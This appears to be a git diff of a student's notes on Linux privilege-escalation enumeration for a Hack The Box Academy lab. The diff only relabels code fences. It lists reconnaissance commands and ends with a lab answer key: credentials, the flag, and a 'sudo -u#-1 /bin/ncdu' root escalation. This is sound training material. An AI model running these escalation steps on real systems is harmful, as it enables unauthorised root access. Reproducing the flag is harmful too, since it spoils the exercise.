@@ -1,21 +1,21 @@
 # Environment Enumeration
 ## List Current Processes
 
-```sh
+```shellsession
 $ ps aux | grep root
 ```
 
 ## List Current Terminal-Attached Processes
 `Logged in Users`: Knowing which other users are logged into the system and what they are doing can provide greater insight into possible local lateral movement and privilege escalation paths.
 
-```sh
+```shellsession
 $ ps au
 ```
 
 ## Sudo - List User's Privileges
 `Sudo Privileges`: Can the user run any commands either as another user or as root? If you do not have credentials for the user, it may not be possible to leverage sudo permissions. However, often sudoer entries include `NOPASSWD`, meaning that the user can run the specified command without being prompted for a password. 
 
-```sh
+```shellsession
 $ sudo -l
 
 Matching Defaults entries for sysadm on NIX02:
@@ -34,14 +34,14 @@ User sysadm may run the following commands on NIX02:
 ## Cron Jobs
 `Cron Jobs`: Cron jobs on Linux systems are similar to Windows scheduled tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.
 
-```sh
+```shellsession
 $ ls -la /etc/cron.daily/
 ```
 
 ## File Systems & Additional Drives
 `Unmounted File Systems and Additional Drives`: If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.
 
-```sh
+```shellsession
 $ lsblk
 ```
 
@@ -50,14 +50,14 @@ $ lsblk
 ## Find Writable Directories
 `Writeable Directories`: It is important to discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable.
 
-```sh
+```shellsession
 $ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
 ```
 
 ## Find Writable Files
 
 
-```sh
+```shellsession
 $ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 ```
 
@@ -90,13 +90,13 @@ In a domain environment we'll definitely want to check `/etc/resolv.conf` if the
 
 We'll also want to check the arp table to see what other hosts the target has been communicating with.
 
-```sh
+```shellsession
 $ arp -a
 ```
 
 ### Existing users
 
-```sh
+```shellsession
 $ cat /etc/passwd | cut -f1 -d:
 ```
 
@@ -105,20 +105,20 @@ With Linux, several different hash algorithms can be used to make the passwords 
 
 We'll also want to check which users have login shells. Once we see what shells are on the system, we can check each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a `shellshock` exploit.
 
-```sh
+```shellsession
 $ grep "sh$" /etc/passwd
 ```
 
 ### Existing Groups
 Each user in Linux systems is assigned to a specific group or groups and thus receives special privileges. For example, if we have a folder named `dev` only for developers, a user must be assigned to the appropriate group to access that folder. The information about the available groups can be found in the `/etc/group` file, which shows us both the group name and the assigned user names.
 
-```sh
+```shellsession
 $ cat /etc/group
 ```
 
 We can then use the `getent` command to list members of any interesting groups.
 
-```sh
+```shellsession
 $ getent group sudo
 
 sudo:x:27:mrb3n
@@ -129,7 +129,7 @@ We can also check out which users have a folder under the `/home` directory. We'
 ### Mounted File Systems
 A mounted file system is a file system that is attached to a particular directory on the system and accessed through that directory.
 
-```sh
+```shellsession
 $ df -h
 ```
 
@@ -138,25 +138,25 @@ For example, some file systems can only be read by the operating system, while o
 ### Unmounted File Systems
 When a file system is unmounted, it is no longer accessible by the system.
 
-```sh
+```shellsession
 $ cat /etc/fstab | grep -v "#" | column -t
 ```
 
 ### All Hidden Files
 
-```sh
+```shellsession
 $ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
 ```
 
 ### All Hidden Directories
 
-```sh
+```shellsession
 $ find / -type d -name ".*" -ls 2>/dev/null
 ```
 
 ### Temporary Files
 
-```sh
+```shellsession
 $ ls -l /tmp /var/tmp /dev/shm
 ```
 
@@ -164,7 +164,7 @@ $ ls -l /tmp /var/tmp /dev/shm
 SSH to 10.129.205.110 (ACADEMY-LLPE-SUDO), with user "htb-student" and password "HTB_@cademy_stdnt!"
 1. Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer. **Answer: HTB{1nt3rn4l_5cr1p7_l34k}**
    - Find out which command we can run as root → we can run `ncdu` as root:
-        ```sh
+        ```shellsession
         $ sudo -l
         Matching Defaults entries for htb-student on ubuntu:
             env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -173,14 +173,14 @@ SSH to 10.129.205.110 (ACADEMY-LLPE-SUDO), with user "htb-student" and password 
             (ALL, !root) /bin/ncdu
         ```
    - Escalate privilege using this [technique](https://gtfobins.org/gtfobins/ncdu/):
-        ```sh
+        ```shellsession
         $ sudo -u#-1 /bin/ncdu
         [Press b]
         # whoami 
         root
         ```
    - Look for the flag with `HTB{` pattern:
-        ```sh
+        ```shellsession
         # find / -type f -exec grep -Hn "HTB{" {} +
         /usr/lib/int-check.sh:1:HTB{1nt3rn4l_5cr1p7_l34k}
         ```
